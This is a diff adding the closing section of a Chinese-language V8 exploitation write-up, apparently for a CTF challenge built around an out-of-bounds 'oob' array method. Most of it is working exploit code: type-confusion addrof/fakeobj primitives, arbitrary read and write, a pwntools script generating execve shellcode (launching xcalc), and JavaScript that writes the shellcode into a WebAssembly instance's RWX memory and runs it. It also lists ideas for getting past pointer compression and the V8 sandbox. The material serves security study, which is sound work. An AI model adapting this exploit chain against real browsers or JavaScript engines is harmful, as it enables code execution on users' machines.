@@ -479,7 +479,251 @@ function arb_write64(addr, data) {
 }
 ```
 
-现在获得了任意地址读写，最简单的方法就是
+现在获得了任意地址读写，最直接的思路就是：
 
-[ref](https://cloud.tencent.com/developer/article/1764424)
-[ref - sandbox](https://tttang.com/archive/1443/)
+0. 构造任意地址读写原语
+1. 构造 WASM 实例
+2. 读 rwx 空间地址
+3. 写 shellcode
+4. 调用 WASM 函数执行 shellcode
+
+> [!todo] 
+> 上述思路是最直接的 v8 利用思路，但是也存在指针压缩、v8 沙箱等情况，这时候可以考虑：
+>
+> 1. 通过 JSFunction 的 JIT 优化机制，使用立即数写 shellcode
+> 2. 利用 WasmInstance 的全局变量 `imported_mutable_globals`
+> 3. 篡改 MemoryChunk 使 JIT function 的 W^X 失效
+
+但是实施起来还需要结合调试定位 RWX 内存的具体地址，是通过定位 `wasm_instance + 偏移` 获得的。
+
+此外 `wasm_code` 的内容其实无所谓，只要去 [WasmFiddle](https://github.com/wasdk/WasmFiddle) 上用含有 main 函数的 C 语言生成一段字节码就可以了，这只是为了申请 rwx 空间并保留对其的函数引用，和 wasm 代码功能无关：
+
+```javascript
+  let wasm_code = new Uint8Array([
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
+    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
+    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
+    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
+    0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253,
+    182, 245, 125, 11,
+  ]);
+  let wasm_module = new WebAssembly.Module(wasm_code);
+  let wasm_instance = new WebAssembly.Instance(wasm_module);
+  let func = wasm_instance.exports.main;
+  let wasm_instance_addr = get_addr(wasm_instance);
+  let func_addr = get_addr(func);
+  // %DebugPrint(wasm_instance);
+  // %DebugPrint(func);
+  // %SystemBreak();
+
+  let rwx_addr = arb_read(wasm_instance_addr + 0x88n);
+  helper.printhex(rwx_addr);
+  // %SystemBreak();
+```
+
+最后就是用任意写的能力把 shellcode 到 rwx 内存中，下面给出 shellcode 的生成方式：
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#   expBy : @eastXueLian
+#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
+#   Remote: ./exp.py remote ./pwn ip:port
+
+from lianpwn import *
+from pwncli import *
+
+context.arch = "amd64"
+
+shellcode = asm(shellcraft.execve("/usr/bin/xcalc", 0, ["DISPLAY=:0"]))
+
+print("let shellcode = [")
+for x in [shellcode[i : i + 8] for i in range(0, len(shellcode), 8)]:
+    print(hex(u64_ex(x)), end="n, ")
+print("];")
+```
+
+最后整体利用代码如下：
+
+```javascript
+class Helpers {
+  constructor() {
+    this.buf = new ArrayBuffer(8);
+    this.f64 = new Float64Array(this.buf);
+    this.f32 = new Float32Array(this.buf);
+    this.u32 = new Uint32Array(this.buf);
+    this.u64 = new BigUint64Array(this.buf);
+    this.state = {};
+  }
+
+  ftoil(f) {
+    this.f64[0] = f;
+    return this.u32[0];
+  }
+
+  ftoih(f) {
+    this.f64[0] = f;
+    return this.u32[1];
+  }
+
+  itof(i) {
+    this.u32[0] = i;
+    return this.f32[0];
+  }
+
+  f64toi64(f) {
+    this.f64[0] = f;
+    return this.u64[0];
+  }
+
+  i64tof64(i) {
+    this.u64[0] = i;
+    return this.f64[0];
+  }
+
+  clean() {
+    this.state.fake_object.fill(0);
+  }
+
+  hex(x) {
+    return x.toString(16).padStart(16, "0");
+  }
+
+  printhex(val) {
+    console.log("0x" + val.toString(16));
+  }
+
+  add_ref(object) {
+    this.state[this.i++] = object;
+  }
+
+  gc() {
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+    new ArrayBuffer(0x7fe00000);
+  }
+}
+
+let helper = new Helpers();
+
+console.log("STEP 0 - Leak maps with oob access.");
+
+let obj = {};
+let obj_list = [obj];
+let float_list = [4.3];
+
+// %DebugPrint(obj_list);
+// %DebugPrint(float_list);
+
+let obj_list_map = obj_list.oob();
+let float_list_map = float_list.oob();
+
+// %SystemBreak();
+
+console.log("STEP 1 - Type confusion.");
+
+function get_addr(victim) {
+  obj_list[0] = victim;
+  obj_list.oob(float_list_map);
+  let res = helper.f64toi64(obj_list[0]) - 1n;
+  obj_list.oob(obj_list_map);
+  return res;
+}
+
+function get_obj(addr) {
+  float_list[0] = helper.i64tof64(addr | 1n);
+  float_list.oob(obj_list_map);
+  let res = float_list[0];
+  float_list.oob(float_list_map);
+  return res;
+}
+
+let evil_float_array = [
+  float_list_map,
+  helper.i64tof64(0n),
+  helper.i64tof64(0xdeadbeefn),
+  helper.i64tof64((0x80n << 32n) | 0n),
+  helper.i64tof64(0xdeadcafen),
+  helper.i64tof64(0x31337n),
+];
+
+let fake_array_addr = get_addr(evil_float_array);
+let fake_elements_addr = fake_array_addr + 0x30n;
+let fake_obj = get_obj(fake_elements_addr);
+console.log(fake_obj.length);
+
+// %DebugPrint(evil_float_array);
+// %DebugPrint(fake_obj);
+// %SystemBreak();
+
+console.log("STEP 2 - Arbitary read and write with fake_obj.");
+
+function arb_write(addr, data) {
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  fake_obj[0] = helper.i64tof64(data);
+  console.log(
+    "[DEBUG] Writing 0x" + helper.hex(data) + " to 0x" + helper.hex(addr),
+  );
+}
+
+function arb_read(addr) {
+  evil_float_array[2] = helper.i64tof64((addr - 0x10n) | 1n);
+  return helper.f64toi64(fake_obj[0]);
+}
+
+let data_buf = new ArrayBuffer(0x1000);
+let data_view = new DataView(data_buf);
+let buf_backing_store_addr = get_addr(data_buf) + 0x20n;
+
+console.log("STEP 3 - Write shellcode to wasm_instance's rwx memory.");
+
+let exp = () => {
+  let wasm_code = new Uint8Array([
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
+    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
+    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
+    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
+    0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253,
+    182, 245, 125, 11,
+  ]);
+  let wasm_module = new WebAssembly.Module(wasm_code);
+  let wasm_instance = new WebAssembly.Instance(wasm_module);
+  let func = wasm_instance.exports.main;
+  let wasm_instance_addr = get_addr(wasm_instance);
+  let func_addr = get_addr(func);
+  // %DebugPrint(wasm_instance);
+  // %DebugPrint(func);
+  // %SystemBreak();
+
+  let rwx_addr = arb_read(wasm_instance_addr + 0x88n);
+  helper.printhex(rwx_addr);
+  // %SystemBreak();
+
+  let shellcode = [
+    0x10101010101b848n,
+    0x68632eb848500101n,
+    0x431480169722e6fn,
+    0xf631d231e7894824n,
+    0x50f583b6an,
+  ];
+
+  arb_write(buf_backing_store_addr, rwx_addr);
+  for (let i = 0; i < shellcode.length; i++) {
+    data_view.setBigInt64(i * 8, shellcode[i], true);
+  }
+
+  func();
+};
+
+exp();
+```
+
+---
+
+# References
+
+1. [Exploiting CVE-2021-21225 and disabling W^X](https://tiszka.com/blog/CVE_2021_21225_exploit.html) . *[tiszka](https://tiszka.com/)*
+2. [v8 pwn入门篇利用合集](https://blog.csdn.net/qq_61670993/article/details/135316299) . *[XiaozaYa](https://blog.csdn.net/qq_61670993)*
+3. [V8 沙箱绕过](https://tttang.com/archive/1443/) . *[Jayl1n](https://tttang.com/user/Jayl1n)*
